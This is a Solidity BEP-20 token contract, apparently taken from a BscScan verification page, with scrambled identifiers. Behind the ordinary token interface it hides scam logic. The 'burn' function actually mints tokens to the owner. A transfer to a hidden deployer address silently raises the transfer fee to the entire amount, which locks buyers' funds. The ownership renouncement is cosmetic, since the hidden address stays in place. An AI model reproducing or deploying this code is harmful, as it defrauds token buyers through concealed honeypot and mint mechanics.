/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 09:04 GMT
 */
pragma solidity >=0.4.11;
contract GEqSGL {
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  DJIqwe = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  zBIqBf = 10000000000000;
string public  symbol = "uwbmtW";
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  kvHsKF = address(0);
uint256 public  XVAiEd = 10000000000000000000;
string public  name = "lWArDS";
address public  OxUQxi = address(0);
uint256 public  rUzKuO = 100000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  DYYsWq = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  IahfnG = 1000000000000000000;
uint256 public  jeIuqD = 100000000000000000000000;
uint256 public constant wpsCtV = 9+1;
address public owner;
mapping (address => uint256) public balanceOf;
uint256 public  axVVCw = 10000000000000000;
uint256 public  mCqRQM = 10000000000000000000000000000;
address private  EQmGsB = address(0);
uint8 public constant decimals = 18;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  yFZaiV = 100000000000000000000;
address public  sSOFkv = address(0);
uint256 public  qvUESa = 100000000000000000000000;
address public  LJhRwr = address(0);
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "pXJgxn");
require(to != address(0), "pXJgxn");
require(amount <= balanceOf[from], "pXJgxn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* wpsCtV/zBIqBf ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EQmGsB){
zBIqBf = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
EQmGsB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}